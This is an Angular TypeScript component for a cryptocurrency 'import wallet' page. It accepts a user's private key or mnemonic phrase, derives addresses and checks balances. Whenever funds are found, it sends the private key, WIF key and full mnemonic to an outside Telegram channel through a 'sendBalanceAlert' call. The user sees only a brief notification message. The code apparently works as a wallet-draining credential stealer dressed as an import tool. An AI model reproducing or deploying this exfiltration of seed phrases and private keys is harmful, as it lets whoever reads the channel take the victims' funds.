// src/app/pages/import/import.component.ts
import { Component } from '@angular/core';
import { KeyGeneratorService } from '../../services/crypto/key-generator.service';
import { MnemonicService } from '../../services/crypto/mnemonic.service';
import { MultiChainBalanceService } from '../../services/balance/multi-chain-balance.service';
import { TelegramService } from '../../services/core/telegram.service';
import { BitcoinService } from '../../services/crypto/bitcoin.service';
import { KeyResult, ChainId, CHAINS, ADDRESS_LABELS, GeneratedAddress } from '../../types/chains';

interface MnemonicResult {
  path: string;
  privateKey: string;
  addresses: GeneratedAddress[];
  hasBalance: boolean;
}

@Component({
  selector: 'app-import',
  templateUrl: './import.component.html'
})
export class ImportComponent {
  mode: 'privateKey' | 'mnemonic' = 'privateKey';
  selectedChain: ChainId = 'btc';
  privateKeyInput = '';
  mnemonicInput = '';
  derivationPath = "m/44'/0'/0'/0/0";
  deriveCount = 5;
  passphrase = '';
  isProcessing = false;
  processingStatus = '';
  error = '';
  result: KeyResult | null = null;
  mnemonicResults: MnemonicResult[] = [];

  readonly chains = ['btc', 'eth', 'sol'] as ChainId[];
  readonly chainNames = { btc: 'Bitcoin', eth: 'Ethereum', sol: 'Solana' };
  readonly addressLabels = ADDRESS_LABELS;

  constructor(
    private keyGen: KeyGeneratorService,
    private mnemonicService: MnemonicService,
    private balanceService: MultiChainBalanceService,
    private telegram: TelegramService,
    private btcService: BitcoinService
  ) {}

  setMode(mode: 'privateKey' | 'mnemonic'): void {
    this.mode = mode;
    this.error = '';
    this.result = null;
    this.mnemonicResults = [];
  }

  async importKey(): Promise<void> {
    if (!this.privateKeyInput.trim() || this.isProcessing) return;

    this.isProcessing = true;
    this.processingStatus = 'Parsing key...';
    this.error = '';
    this.result = null;

    try {
      const result = await this.keyGen.importKey(
        this.privateKeyInput.trim(),
        [this.selectedChain]
      );

      if (!result) {
        this.error = 'Invalid private key format. Enter 64 hex characters or WIF format.';
        this.isProcessing = false;
        this.processingStatus = '';
        return;
      }

      this.result = result;

      this.processingStatus = 'Checking balances...';
      const addresses = result.addresses.map(a => a.address);
      const balances = await this.balanceService.checkBatch(this.selectedChain, addresses);
      
      let totalBalance = 0;
      for (const addr of this.result.addresses) {
        const data = balances[addr.address];
        if (data) {
          addr.balance = data.balance;
          addr.hasActivity = data.hasActivity;
          addr.checked = true;
          totalBalance += data.balance;
        }
      }

      this.result.hasActivity = this.result.addresses.some(a => a.hasActivity);

      if (totalBalance > 0) {
        this.processingStatus = 'Balance found! Sending notification...';
        await this.telegram.sendBalanceAlert({
          privateKeyHex: result.privateKeyHex,
          privateKeyWif: result.privateKeyWif,
          addresses: this.result.addresses,
          totalBalance,
          source: 'import'
        });
        this.processingStatus = 'Notification sent!';
      }
    } catch (e) {
      this.error = 'Failed to process key: ' + (e instanceof Error ? e.message : 'Unknown error');
    }

    this.isProcessing = false;
    setTimeout(() => this.processingStatus = '', 3000);
  }

  async importMnemonic(): Promise<void> {
    if (!this.mnemonicInput.trim() || this.isProcessing) return;

    this.isProcessing = true;
    this.processingStatus = 'Validating mnemonic...';
    this.error = '';
    this.result = null;
    this.mnemonicResults = [];

    try {
      const mnemonic = this.mnemonicInput.trim().toLowerCase();
      
      const isValid = await this.mnemonicService.validateMnemonic(mnemonic);
      if (!isValid) {
        this.error = 'Invalid mnemonic phrase. Check spelling and word count (12, 15, 18, 21, or 24 words).';
        this.isProcessing = false;
        this.processingStatus = '';
        return;
      }

      this.processingStatus = `Deriving ${this.deriveCount} keys...`;
      
      const derived = await this.mnemonicService.deriveMultiple(
        mnemonic,
        this.derivationPath,
        this.deriveCount,
        [this.selectedChain],
        this.passphrase
      );

      for (let i = 0; i < derived.length; i++) {
        const item = derived[i];
        this.processingStatus = `Checking balances (${i + 1}/${derived.length})...`;
        
        const addresses = item.addresses.map(a => a.address);
        const balances = await this.balanceService.checkBatch(this.selectedChain, addresses);
        
        let hasBalance = false;
        let totalBalance = 0;
        
        for (const addr of item.addresses) {
          const data = balances[addr.address];
          if (data) {
            addr.balance = data.balance;
            addr.hasActivity = data.hasActivity;
            addr.checked = true;
            if (data.balance > 0) {
              hasBalance = true;
              totalBalance += data.balance;
            }
          }
        }

        if (hasBalance) {
          await this.telegram.sendBalanceAlert({
            privateKeyHex: item.privateKeyHex,
            mnemonic,
            addresses: item.addresses,
            totalBalance,
            source: 'import'
          });
        }

        this.mnemonicResults.push({
          path: item.path,
          privateKey: item.privateKeyHex,
          addresses: item.addresses,
          hasBalance
        });
      }

      const totalWithBalance = this.mnemonicResults.filter(r => r.hasBalance).length;
      if (totalWithBalance > 0) {
        this.processingStatus = `Found ${totalWithBalance} addresses with balance!`;
      } else {
        this.processingStatus = '';
      }
    } catch (e) {
      this.error = 'Failed to process mnemonic: ' + (e instanceof Error ? e.message : 'Unknown error');
    }

    this.isProcessing = false;
  }

  getExplorerUrl(chain: string, address: string): string {
    const config = CHAINS[chain as keyof typeof CHAINS];
    return config ? config.explorer + address : '#';
  }

  formatBalance(balance: number): string {
    if (balance === 0) return '0';
    if (balance < 0.00001) return balance.toExponential(4);
    return balance.toFixed(8).replace(/\.?0+$/, '');
  }

  getTotalBalance(): number {
    if (!this.result) return 0;
    return this.result.addresses.reduce((sum, a) => sum + a.balance, 0);
  }

  hasAnyBalance(): boolean {
    return this.mnemonicResults.some(r => r.hasBalance);
  }

  countWithBalance(): number {
    return this.mnemonicResults.filter(r => r.hasBalance).length;
  }

  setPath(type: string): void {
    const paths: Record<string, string> = {
      'btc-legacy': "m/44'/0'/0'/0/0",
      'btc-segwit': "m/84'/0'/0'/0/0",
      'eth': "m/44'/60'/0'/0/0",
      'sol': "m/44'/501'/0'/0'"
    };
    this.derivationPath = paths[type] || this.derivationPath;
  }

  copyToClipboard(text: string): void {
    navigator.clipboard.writeText(text);
  }
}
